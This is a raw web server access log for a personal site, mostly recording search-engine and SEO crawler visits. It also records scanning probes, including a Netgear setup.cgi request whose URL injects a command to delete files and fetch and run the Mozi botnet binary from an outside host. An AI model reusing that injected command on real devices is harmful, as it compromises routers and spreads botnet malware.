114.119.147.73 - - [30/Jun/2022:06:49:37 +0000] "GET /node/401 HTTP/1.1" 301 178 "https://mrchoke.org/node/date/2004/07/page/4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
20.127.168.184 - - [30/Jun/2022:06:50:25 +0000] "GET /wp-admin/css/ HTTP/1.1" 404 197 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
114.119.147.97 - - [30/Jun/2022:06:50:30 +0000] "GET /node/505?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/505?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
20.127.168.184 - - [30/Jun/2022:06:50:33 +0000] "GET /.well-known/ HTTP/1.1" 404 197 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
114.119.147.97 - - [30/Jun/2022:06:50:39 +0000] "GET /node/505?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/505?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
20.127.168.184 - - [30/Jun/2022:06:50:39 +0000] "GET /sites/default/files/ HTTP/1.1" 404 197 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
20.127.168.184 - - [30/Jun/2022:06:50:45 +0000] "GET /admin/controller/extension/extension/ HTTP/1.1" 404 197 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
114.119.147.97 - - [30/Jun/2022:06:50:52 +0000] "GET /node/505/?share=linkedin HTTP/1.1" 200 8101 "https://mrchoke.org/node/505?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
20.127.168.184 - - [30/Jun/2022:06:50:54 +0000] "GET /uploads/ HTTP/1.1" 404 197 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
20.127.168.184 - - [30/Jun/2022:06:51:03 +0000] "GET /images/ HTTP/1.1" 404 197 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
20.127.168.184 - - [30/Jun/2022:06:51:05 +0000] "GET /files/ HTTP/1.1" 404 197 "binance.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
185.191.171.15 - - [30/Jun/2022:06:51:59 +0000] "GET /img_7519 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.14 - - [30/Jun/2022:06:52:01 +0000] "GET /img_7519/ HTTP/1.1" 200 7886 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
66.249.71.182 - - [30/Jun/2022:06:52:37 +0000] "GET /feed/?attachment_id=1516 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
114.119.147.87 - - [30/Jun/2022:06:52:43 +0000] "GET /node/category/blog/page/13 HTTP/1.1" 302 154 "https://mrchoke.org/node/category/blog/page/14?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:06:52:48 +0000] "GET /node/category/blog/page/13 HTTP/1.1" 301 178 "https://mrchoke.org/node/category/blog/page/14?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:06:52:53 +0000] "GET /node/category/blog/page/13/ HTTP/1.1" 200 13397 "https://mrchoke.org/node/category/blog/page/14?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
87.250.224.3 - - [30/Jun/2022:06:53:06 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.3 - - [30/Jun/2022:06:53:09 +0000] "GET /node/category/%E0%B9%80%E0%B8%8A%E0%B8%B5%E0%B8%A2%E0%B8%87%E0%B9%83%E0%B8%AB%E0%B8%A1%E0%B9%88 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
74.125.210.173 - - [30/Jun/2022:06:57:08 +0000] "GET /feed HTTP/1.1" 404 134 "-" "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)"
185.7.214.104 - - [30/Jun/2022:06:57:13 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.147.87 - - [30/Jun/2022:06:58:36 +0000] "GET /node/tag/smart-bike?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/tag/smart-bike?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:06:58:39 +0000] "GET /node/tag/smart-bike?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/tag/smart-bike?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:06:58:40 +0000] "GET /node/tag/smart-bike/?ak_action=accept_mobile HTTP/1.1" 200 11956 "https://mrchoke.org/node/tag/smart-bike?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.71.178 - - [30/Jun/2022:06:58:42 +0000] "GET /page/68?ak_action=accept_mobile HTTP/1.1" 302 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.25 - - [30/Jun/2022:06:58:43 +0000] "GET /page/68?ak_action=accept_mobile HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.191.171.43 - - [30/Jun/2022:06:59:29 +0000] "GET /img_6727-2 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.8 - - [30/Jun/2022:06:59:31 +0000] "GET /img_6727-2/ HTTP/1.1" 200 7900 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.4 - - [30/Jun/2022:07:02:37 +0000] "GET /node/date/2004/11/15/ HTTP/2.0" 200 7965 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.23 - - [30/Jun/2022:07:06:21 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.41 - - [30/Jun/2022:07:06:22 +0000] "GET /node/category/domain/page/12 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.7 - - [30/Jun/2022:07:06:24 +0000] "GET /node/category/domain/page/12/ HTTP/1.1" 200 18827 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.87 - - [30/Jun/2022:07:09:19 +0000] "GET /node/date/2014/01/24 HTTP/1.1" 301 178 "https://mrchoke.org/node/1348?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:07:09:29 +0000] "GET /node/date/2014/01/24/ HTTP/1.1" 200 10583 "https://mrchoke.org/node/1348?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.2 - - [30/Jun/2022:07:12:59 +0000] "GET /node/tag/geoname/ HTTP/2.0" 200 8406 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.7 - - [30/Jun/2022:07:13:46 +0000] "GET /node/28 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.43 - - [30/Jun/2022:07:13:48 +0000] "GET /node/28/ HTTP/1.1" 200 8827 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.229 - - [30/Jun/2022:07:18:02 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [30/Jun/2022:07:18:04 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [30/Jun/2022:07:21:34 +0000] "GET /img_7231/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.81 - - [30/Jun/2022:07:21:37 +0000] "GET /node/228?share=facebook HTTP/1.1" 302 154 "https://mrchoke.org/node/228?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
34.72.252.182 - - [30/Jun/2022:07:21:44 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
34.72.252.182 - - [30/Jun/2022:07:21:45 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "http://mrchoke.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
114.119.147.81 - - [30/Jun/2022:07:21:51 +0000] "GET /node/228?share=facebook HTTP/1.1" 301 178 "https://mrchoke.org/node/228?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [30/Jun/2022:07:21:54 +0000] "GET /node/1731/screenshot-2014-02-18-14-50-51 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
66.249.71.182 - - [30/Jun/2022:07:22:35 +0000] "GET /node/151/feed HTTP/1.1" 302 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.28 - - [30/Jun/2022:07:22:36 +0000] "GET /node/151/feed HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.31 - - [30/Jun/2022:07:22:36 +0000] "GET /node/151/feed/ HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.191.171.39 - - [30/Jun/2022:07:23:51 +0000] "GET /node/tag/openshift-origin/page/2 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.35 - - [30/Jun/2022:07:23:53 +0000] "GET /node/tag/openshift-origin/page/2/ HTTP/1.1" 200 13913 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.11 - - [30/Jun/2022:07:24:01 +0000] "GET /node/date/2004/11/11/ HTTP/2.0" 200 9049 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.44 - - [30/Jun/2022:07:26:07 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.33 - - [30/Jun/2022:07:26:08 +0000] "GET /node/tag/d700 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.23 - - [30/Jun/2022:07:26:10 +0000] "GET /node/tag/d700 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.44 - - [30/Jun/2022:07:26:12 +0000] "GET /node/tag/d700/ HTTP/1.1" 200 7560 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.39 - - [30/Jun/2022:07:26:32 +0000] "GET /node/date/2009/04/14 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.36 - - [30/Jun/2022:07:26:34 +0000] "GET /node/date/2009/04/14/ HTTP/1.1" 200 8336 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.87 - - [30/Jun/2022:07:27:08 +0000] "GET /node/1356/img_7245?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/1356/img_7245?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:07:27:17 +0000] "GET /node/1356/img_7245?ak_action=reject_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/1356/img_7245?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:07:27:33 +0000] "GET /node/1356/img_7245/?ak_action=reject_mobile HTTP/1.1" 200 7998 "https://mrchoke.org/node/1356/img_7245?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.196.220.81 - - [30/Jun/2022:07:27:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://188.166.238.131:80/admin/login.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0"
185.196.220.81 - - [30/Jun/2022:07:27:51 +0000] "" 400 0 "-" "-"
216.244.66.229 - - [30/Jun/2022:07:28:08 +0000] "GET /wp-content/uploads/2012/04/25550413-040534.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.191.171.19 - - [30/Jun/2022:07:30:02 +0000] "GET /node/244 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.13 - - [30/Jun/2022:07:30:04 +0000] "GET /node/244/ HTTP/1.1" 200 11881 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.229 - - [30/Jun/2022:07:30:14 +0000] "GET /node/category/domain/page/6/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
104.217.249.182 - - [30/Jun/2022:07:30:25 +0000] "GET / HTTP/1.1" 400 264 "-" "Linux Gnu (cow)"
114.119.147.97 - - [30/Jun/2022:07:30:50 +0000] "GET /node/939/img_6364?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/939/img_6364?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [30/Jun/2022:07:31:04 +0000] "GET /node/939/img_6364?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/939/img_6364?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:07:32:00 +0000] "GET /node/939/img_6364?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/939/img_6364?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:07:32:18 +0000] "GET /node/939/img_6364?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/939/img_6364?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [30/Jun/2022:07:33:02 +0000] "GET /node/category/ntfs/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
123.183.224.29 - - [30/Jun/2022:07:33:27 +0000] "GET / HTTP/1.1" 200 294 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
114.119.147.75 - - [30/Jun/2022:07:33:29 +0000] "GET /node/336?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/336?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [30/Jun/2022:07:33:42 +0000] "GET /node/336?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/336?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [30/Jun/2022:07:33:49 +0000] "GET /node/336/?ak_action=accept_mobile HTTP/1.1" 200 8732 "https://mrchoke.org/node/336?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:07:34:20 +0000] "GET /node/790/img_6168?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/790/img_6168?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:07:34:26 +0000] "GET /node/790/img_6168?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/790/img_6168?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:07:34:30 +0000] "GET /node/790/img_6168/?ak_action=accept_mobile HTTP/1.1" 200 7907 "https://mrchoke.org/node/790/img_6168?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.7.214.104 - - [30/Jun/2022:07:34:38 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.147.74 - - [30/Jun/2022:07:36:26 +0000] "GET /node/55?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/55?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:07:36:31 +0000] "GET /node/55?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/55?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:07:36:37 +0000] "GET /node/55/?share=reddit HTTP/1.1" 200 8346 "https://mrchoke.org/node/55?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.3 - - [30/Jun/2022:07:36:42 +0000] "GET /node/date/2004/10/21/ HTTP/2.0" 200 7670 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [30/Jun/2022:07:36:51 +0000] "GET /img_6731 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.97 - - [30/Jun/2022:07:38:42 +0000] "GET /node/693/6 HTTP/1.1" 404 134 "http://www.mrchoke.org/node/693/5" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
200.110.56.86 - - [30/Jun/2022:07:39:10 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://200.110.56.86:59974/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
114.119.147.86 - - [30/Jun/2022:07:40:17 +0000] "GET /node/date/2013 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:07:40:22 +0000] "GET /node/date/2013 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:07:40:26 +0000] "GET /node/date/2013/ HTTP/1.1" 403 134 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.71.25 - - [30/Jun/2022:07:40:32 +0000] "GET /node/date/2014/01/25/ HTTP/1.1" 200 9874 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.229 - - [30/Jun/2022:07:41:05 +0000] "GET /img_6754 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.86 - - [30/Jun/2022:07:42:39 +0000] "GET /node/39?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/39" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:07:42:49 +0000] "GET /node/39?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/39" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:07:44:13 +0000] "GET /node/date/2007/03/page/2 HTTP/1.1" 301 178 "https://mrchoke.org/node/date/2007/03/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:07:44:17 +0000] "GET /node/date/2007/03/page/2/ HTTP/1.1" 200 12790 "https://mrchoke.org/node/date/2007/03/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:07:46:06 +0000] "GET /node/date/2004/06/13 HTTP/1.1" 302 154 "https://mrchoke.org/node/414?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:07:46:15 +0000] "GET /node/date/2004/06/13 HTTP/1.1" 301 178 "https://mrchoke.org/node/414?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:07:46:21 +0000] "GET /node/date/2004/06/13/ HTTP/1.1" 200 9120 "https://mrchoke.org/node/414?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
64.227.97.195 - - [30/Jun/2022:07:48:30 +0000] "\x00\x0E8J\xA4\x85\xE8\xFAE!\xF2\x00\x00\x00\x00\x00" 400 166 "-" "-"
114.119.147.81 - - [30/Jun/2022:07:49:06 +0000] "GET /node/1537/screenshot-2014-02-04-22-44-30?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/1537/screenshot-2014-02-04-22-44-30?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.13 - - [30/Jun/2022:07:50:15 +0000] "GET /node/date/2006/10/22/page/2/ HTTP/2.0" 200 12011 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
